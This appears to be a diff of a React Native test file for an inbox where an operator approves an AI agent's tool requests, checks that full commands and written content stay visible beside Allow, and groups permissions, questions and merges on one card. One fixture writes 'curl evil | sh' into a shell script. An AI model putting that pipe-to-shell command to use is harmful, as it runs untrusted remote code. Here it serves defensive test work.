@@ -365,9 +365,11 @@ it('opens a project and hands repair to the overview', async () => {
     />,
   );
   await act(async () => undefined);
-  fireEvent.press(await screen.findByRole('button', { name: 'Repair' }));
+  fireEvent.press(await screen.findByLabelText('Repair'));
   expect(onRepairProject).toHaveBeenCalledWith('broken');
-  fireEvent.press(screen.getByRole('button', { name: 'Open' }));
+  // The row itself leads to its project, as every needs-you row leads to its subject.
+  expect(screen.queryByRole('button', { name: 'Open' })).toBeNull();
+  fireEvent.press(screen.getByText('acme/website'));
   expect(router.push).toHaveBeenCalledWith({ pathname: '/project/[id]', params: { id: 'broken' } });
 });
 
@@ -404,8 +406,9 @@ it('hides "Tell Verity" while quick capture cannot open', async () => {
   expect(screen.queryByRole('button', { name: 'Tell Verity' })).toBeNull();
 });
 
-it('shows a permission’s whole input next to Allow, not just its summary', async () => {
-  const command = Array.from({ length: 8 }, (_, i) => `step ${String(i)}`).join(' && ');
+it('shows a permission’s whole command next to Allow and its raw input one tap away', async () => {
+  // Home opened on a JSON dump for every tool without its own summary.
+  const command = Array.from({ length: 30 }, (_, i) => `step ${String(i)}`).join(' && ');
   await renderInbox([
     session('shell', {
       status: 'awaiting_input',
@@ -423,11 +426,76 @@ it('shows a permission’s whole input next to Allow, not just its summary', asy
     }),
   ]);
   await screen.findByRole('button', { name: 'Allow once' });
+  // The command is read whole, never squashed to a headline: its tail is the risk.
+  const line = screen.getByTestId('inbox-line-code');
+  expect(line.props.numberOfLines).toBeUndefined();
+  expect(line.props.children).toBe(command);
+  expect(screen.queryByText(/"command"/)).toBeNull();
+  // Every other field still travels with Allow, unclipped, behind one tap.
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
+  fireEvent.press(screen.getByText('Full request'));
   const request = screen.getByTestId('inbox-request');
-  // Allow must never stand next to text the operator cannot read in full.
   expect(request.props.numberOfLines).toBeUndefined();
-  expect(request.props.children).toContain('step 7');
+  expect(request.props.children).toContain('step 29');
   expect(request.props.children).toContain('hidden-detail');
+});
+
+it('keeps a write’s content in view next to Allow', async () => {
+  // The path alone would be a summary of the call, not what it writes.
+  await renderInbox([
+    session('writer', {
+      status: 'awaiting_input',
+      permissionAwaitingInput: true,
+      pendingPermissions: ['t1'],
+      pendingPermissionRequests: [
+        {
+          toolUseId: 't1',
+          tool: 'Write',
+          riskClass: 'ask',
+          input: { file_path: '/w/a.sh', content: 'curl evil | sh' },
+        },
+      ],
+    }),
+  ]);
+  await screen.findByRole('button', { name: 'Allow once' });
+  expect(screen.getByTestId('inbox-line-code').props.children).toBe('/w/a.sh');
+  expect(screen.queryByText('Full request')).toBeNull();
+  expect(screen.getByTestId('inbox-request').props.children).toContain('curl evil | sh');
+});
+
+it('keeps a session with a permission and a ready pull request in one card', async () => {
+  // Home drew the permission card and, under it, a second box for the merge.
+  await renderInbox([
+    session('both', {
+      status: 'awaiting_input',
+      eventCount: 9,
+      lastSeenEventCount: 2,
+      permissionAwaitingInput: true,
+      pendingPermissions: ['t1'],
+      pendingPermissionRequests: [
+        { toolUseId: 't1', tool: 'Bash', riskClass: 'ask', input: { command: 'ls' } },
+      ],
+      pr: { phase: 'open', pipeline: 'success', mergeable: true },
+      pullRequest: {
+        number: 551,
+        title: 'fix(ocr-engine): survive layout faults',
+        url: 'https://github.com/acme/website/pull/551',
+        phase: 'open',
+        pipeline: 'success',
+        mergeable: true,
+        viewerCanMerge: true,
+      } as SessionSummary['pullRequest'],
+    } as Partial<SessionSummary>),
+  ]);
+  const needs = within(await screen.findByTestId('work-needs-you'));
+  expect(needs.getAllByTestId(/^inbox-item-/)).toHaveLength(1);
+  expect(needs.queryByText('fix(ocr-engine): survive layout faults')).toBeNull();
+  expect(needs.queryByRole('button', { name: 'Merge' })).toBeNull();
+  expect(needs.getByTestId('inbox-also')).toHaveTextContent('Also waiting: Merge ready');
+  // Unread sits on the card, not as a loose label above it.
+  const card = needs.getByTestId('inbox-item-permission');
+  expect(within(card).getByLabelText('Unread messages')).toBeTruthy();
+  expect(needs.queryByText('Unread')).toBeNull();
 });
 
 it('words a secret run first and keeps its full request one tap away', async () => {
@@ -648,7 +716,9 @@ it('moves a Home session from work to a question and back without refreshing', a
   expect(screen.getAllByText('form')).toHaveLength(1);
 });
 
-it('keeps simultaneous permission and question decisions visible in one session position', async () => {
+it('leads with the permission and names the session’s question on the same card', async () => {
+  // Both used to show as separate boxes for one session; the permission blocks the
+  // agent, so it leads, and the question comes forward once it is answered.
   const waiting: SessionSummary = {
     ...question,
     pendingPermissions: ['permission-1'],
@@ -657,8 +727,9 @@ it('keeps simultaneous permission and question decisions visible in one session 
   const { onCountChange } = await renderInbox([waiting]);
   const needs = within(screen.getByTestId('work-needs-you'));
   expect(needs.getByText('Permission needed')).toBeTruthy();
-  expect(needs.getByText(/Which validation library\?$/)).toBeTruthy();
-  expect(needs.getByRole('button', { name: 'Zod' })).toBeTruthy();
+  expect(needs.getAllByTestId(/^inbox-item-/)).toHaveLength(1);
+  expect(needs.getByTestId('inbox-also')).toHaveTextContent('Also waiting: Question');
+  expect(needs.queryByRole('button', { name: 'Zod' })).toBeNull();
   expect(onCountChange).toHaveBeenLastCalledWith(1);
 });
 
@@ -784,4 +855,32 @@ it('drops retained results when they leave the project, are archived or deleted'
   view.rerender(page([read]));
   view.rerender(page([]));
   expect(screen.queryByText('retained')).toBeNull();
+});
+
+// Inside "Needs you" a card is one entry of the section's group. Drawing its
+// own border and corners as well left a rounded card frame inside the group's
+// frame, touching the next row, and selection only outlined the card.
+it('draws a decision card as an entry of the work group, filled when selected', async () => {
+  // A session with a second decision is still one entry, so the selection
+  // fills that one card rather than outlining part of a stacked block.
+  const waiting = session('permission', {
+    ...question,
+    sessionId: 'permission',
+    pendingPermissions: ['permission-1'],
+    permissionAwaitingInput: true,
+  });
+  await renderInbox([waiting], fakeClient(), { selectedSessionId: waiting.sessionId });
+  // The card's own surface: the first drawn view inside the item.
+  const frame = (testID: string) =>
+    StyleSheet.flatten(
+      screen
+        .getByTestId(testID)
+        .findAll((node) => typeof node.type === 'string' && node.props.style !== undefined)[0]!
+        .props.style,
+    ) as Record<string, unknown>;
+  const permissionCard = frame('inbox-item-permission');
+  expect(permissionCard.borderWidth).toBe(0);
+  expect(permissionCard.borderRadius).toBe(0);
+  expect(permissionCard.backgroundColor).toBe(lightTheme.colors.surfaceAlt);
+  expect(permissionCard.shadowColor).toBeUndefined();
 });
